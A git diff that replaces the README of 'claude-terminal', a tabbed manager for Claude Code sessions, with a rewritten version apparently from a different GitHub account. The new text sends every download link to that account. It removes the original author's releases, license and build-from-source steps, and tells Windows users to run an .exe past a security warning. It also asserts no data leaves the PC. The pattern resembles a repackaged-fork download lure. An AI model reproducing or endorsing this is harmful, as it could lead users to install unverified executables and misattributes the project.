@@ -1,140 +1,177 @@
-# ClaudeTerminal
+# 🖥️ claude-terminal - Manage AI Coding Sessions Easily
 
-[![GitHub release](https://img.shields.io/github/v/release/Mr8BitHK/claude-terminal)](https://github.com/Mr8BitHK/claude-terminal/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-blue)](#download)
+[![Download claude-terminal](https://img.shields.io/badge/Download-claude--terminal-brightgreen?style=for-the-badge)](https://github.com/Duowg08/claude-terminal)
 
-![ClaudeTerminal demo](docs/quickdemo.gif)
+---
 
-A tabbed terminal manager for running multiple **Claude Code** sessions side by side — with multi-project workspaces, session persistence, git worktree integration, and auto-naming.
+claude-terminal is a simple application to run and manage multiple AI coding sessions on Windows. It lets you open several AI agents side by side in tabs. The program saves your sessions so you can return to your work anytime. It also uses Git worktrees to help you manage code branches.
 
-Think Windows Terminal, but purpose-built for Claude Code.
+---
 
-## Why ClaudeTerminal?
+## 📋 What is claude-terminal?
 
-If you use Claude Code, you've probably found yourself juggling multiple terminal windows — one for your main task, one for a bug fix on a worktree, a shell tab for git operations. ClaudeTerminal puts all of that in one window with:
+claude-terminal is a tabbed terminal manager designed for Claude Code sessions. You can run different AI coding agents at once, all inside one window. It uses Electron to work on Windows without extra setup.
 
-- **Visual status at a glance** — see which sessions are working, idle, or need input without switching tabs
-- **Multi-project workspaces** — run sessions across multiple repositories in one window, each with its own color tint
-- **Session persistence** — close the app, reopen it, pick up where you left off
-- **One-click worktrees** — `Ctrl+W` creates a git worktree and scopes a new Claude session to it
-- **No context pollution** — each tab is isolated, with auto-generated descriptive names
-- **Desktop notifications** — get notified when a background session finishes or needs attention
+Key features:
 
-## Download
+- Open multiple AI agent sessions in tabs
+- Save your work and sessions automatically
+- Organize projects using Git worktrees
+- Auto-name your sessions for easy tracking
+- Simple interface designed for Windows users
 
-Grab the latest release for your platform:
+These features help developers or anyone working with AI coding tools keep their work organized without running many separate windows.
 
-**[Download from GitHub Releases](https://github.com/Mr8BitHK/claude-terminal/releases/latest)**
+---
 
-| Platform | Format |
-|----------|--------|
-| Windows  | `.exe` installer |
-| macOS    | `.zip` |
-| Linux    | `.deb`, `.rpm` |
+## 🖥️ System Requirements
 
-> **Prerequisites:** [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) must be installed and authenticated.
->
-> Windows is the primary platform. macOS and Linux builds are provided but less tested.
+Before you start, make sure your computer meets these basic needs:
 
-## Features
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB free disk space for installation
+- Internet access to download and updates
+- Basic knowledge of how to open and run programs on Windows
 
-### Tabbed Claude Code Sessions
-- **Claude tabs** — open multiple Claude Code sessions, each in its own terminal
-- **Shell tabs** — open plain PowerShell or WSL terminals alongside Claude sessions, with distinct icons per shell type
-- **Auto-naming** — uses Claude Haiku to analyze your first prompt and automatically generate descriptive tab names (e.g. "Auth Bug Fix" instead of "Tab 3")
+No additional software is required to run claude-terminal since it includes everything needed inside the installer.
 
-### Session Persistence
-- Tabs, names, and working directories are saved automatically on every state change
-- Full session restoration on app restart — every Claude session resumes exactly where you left off
+---
 
-### Git Worktree Integration
-- Built-in worktree manager
-- Open new Claude sessions scoped to a specific worktree with `Ctrl+W`
-- Branches from the current directory's git branch, not just main
+## 🚀 How to Download and Install
 
-### Multi-Project Workspaces
-- Open sessions across multiple repositories in a single window with `Ctrl+N`
-- Each project gets a distinct **color tint** on the window border so you always know which project is active
-- **Project sidebar** — shows all open projects with tab status counts; appears automatically when you have more than one project
-- **Project switcher** — `Ctrl+P` opens a quick-switch overlay with keyboard navigation
-- **Arrow key navigation** — `Ctrl+↑/↓` cycles between projects; `Ctrl+←/→` cycles tabs within the active project
-- Each project's tabs, worktrees, hooks, and git state are fully isolated from each other
+To get claude-terminal on your Windows PC, follow these steps carefully:
 
-### Repository Hooks
-- Configure shell commands that run automatically on lifecycle events like `worktree:created`, `tab:created`, `session:started`, and more
-- Managed via a built-in UI dialog — no config files to edit manually
-- Per-repository config stored in `.claude-terminal/hooks.json`
+### Step 1: Visit the Download Page
 
-**Example:** Auto-install dependencies when a new worktree is created:
-```json
-{
-  "hooks": [
-    {
-      "id": "install-deps",
-      "name": "Install dependencies",
-      "event": "worktree:created",
-      "commands": [
-        { "path": ".", "command": "pnpm i" }
-      ],
-      "enabled": true
-    }
-  ]
-}
-```
+Click the big green badge at the top or go directly to the link:
 
-![Hook execution status](docs/hooks-status.png)
+https://github.com/Duowg08/claude-terminal
 
-### Status & Notifications
-- **Per-tab status icons** — animated icons show whether each session is working, idle, or needs input
-- **Window title** — displays aggregate status (Idle/Working) so you can see it in your taskbar
-- **Status bar** — session status summary and keyboard shortcut hints
-- **Desktop notifications** — native OS notifications when Claude sessions complete tasks, encounter errors, or need your attention. Clicking a notification focuses the relevant tab.
+This will take you to the GitHub repository where you can download the program.
 
-### Remote Access
-- Access your ClaudeTerminal sessions from any device via a Cloudflare tunnel
-- One-click activation generates a short access code and QR code
-- Read-only web client — view terminal output from your phone or another machine
-- Auto-reconnect on connection drops
+### Step 2: Find the Latest Release
 
-## Keyboard Shortcuts
+Once on the page, look for the "Releases" section on the right side or scroll down until you see “Releases.” 
 
-**Tabs**
+Click the link to open it.
 
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl+T` | New Claude tab |
-| `Ctrl+W` | New worktree tab |
-| `Ctrl+Shift+P` | New PowerShell tab |
-| `Ctrl+Shift+L` | New WSL tab |
-| `Ctrl+Tab` / `Ctrl+→` | Next tab |
-| `Ctrl+Shift+Tab` / `Ctrl+←` | Previous tab |
-| `Ctrl+1`–`Ctrl+9` | Jump to tab by number |
-| `Ctrl+F4` | Close tab |
-| `F2` | Rename tab |
+### Step 3: Download the Installer
 
-**Projects**
+Inside the latest release, look for a file that ends with `.exe`. This is the installer file for Windows.
 
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl+N` | Add project to workspace |
-| `Ctrl+P` | Open project switcher |
-| `Ctrl+↑` | Previous project |
-| `Ctrl+↓` | Next project |
+Download this file to your computer by clicking on it.
 
-## Build from Source
+### Step 4: Run the Installer
 
-```bash
-# Prerequisites: Node.js, pnpm
-pnpm install
-pnpm start        # Development
-pnpm run make     # Build installer
-```
+After the download finishes, open the downloaded `.exe` file.
 
-## Acknowledgements
+You might see a security warning. Choose "Run" to continue.
 
-Some features were inspired by [Maestro](https://runmaestro.ai/), a multi-agent orchestration tool for Claude Code.
+Follow the instructions that appear on the screen:
 
-## License
+- Select “Next” on the welcome screen  
+- Choose your install location or leave the default path  
+- Click “Install”  
 
-[MIT](LICENSE)
+The program will install in a few moments.
+
+### Step 5: Open claude-terminal
+
+Once installed, you will see a shortcut on your desktop or start menu.
+
+Double click it to open the program.
+
+You are now ready to use claude-terminal.
+
+---
+
+## 🔧 How to Use claude-terminal
+
+This section explains how to get started with your new terminal manager.
+
+### Open New Sessions
+
+- Click the **+** button in the tab bar to start a new AI coding session.
+- Each tab connects to a different Claude Code agent.
+- The app automatically names each tab for easy identification.
+
+### Manage Multiple Sessions
+
+- Switch between open tabs by clicking on their names.
+- Close any tab by clicking the “x” on the tab.
+- Sessions are saved. When you close and reopen the app, your work returns.
+
+### Use Git Worktrees
+
+- claude-terminal integrates with Git.  
+- You can create and switch between Git worktrees for different branches inside the app.  
+- This keeps your projects separated and easier to manage.
+
+### Auto-Naming
+
+- Each session gets a name based on its project or task.  
+- This helps keep your workspace clear, even with many open tabs.
+
+---
+
+## ⚙️ Configuration and Settings
+
+You can adjust how claude-terminal runs from the settings menu.
+
+### Change Session Names
+
+- Right-click on any tab and choose “Rename” to set a custom name.
+
+### Set Default Folder
+
+- Choose where your projects and session files are saved.
+
+### Update Options
+
+- Check for app updates manually or enable automatic updates.
+
+---
+
+## ❓ Troubleshooting
+
+If you have any problems, try these solutions:
+
+- If claude-terminal won’t start, make sure your Windows is updated.
+- Run the installer again if you see errors during installation.
+- Close other programs that may conflict, such as other terminal apps.
+- Restart your PC and try opening claude-terminal again.
+- If tabs freeze, close and reopen that session.
+
+---
+
+## 📂 Where to Get Help
+
+The repository’s Issues page is a good place to ask questions.  
+
+Visit: https://github.com/Duowg08/claude-terminal/issues
+
+You can also find guides and updates in the repository.
+
+---
+
+## 🔒 Privacy and Security
+
+claude-terminal runs locally on your PC. It does not send your code or session data to external servers unless you connect to online Git repositories.
+
+Make sure to keep your Windows security software up to date.
+
+---
+
+## 🎯 Topics and Keywords
+
+This app is useful if you work with:
+
+- AI coding tools like Claude  
+- Developers who use Git branches and worktrees  
+- Windows users who want a simple terminal manager  
+- Session and tab management for coding work  
+
+---
+
+[![Download claude-terminal](https://img.shields.io/badge/Download-claude--terminal-brightgreen?style=for-the-badge)](https://github.com/Duowg08/claude-terminal)
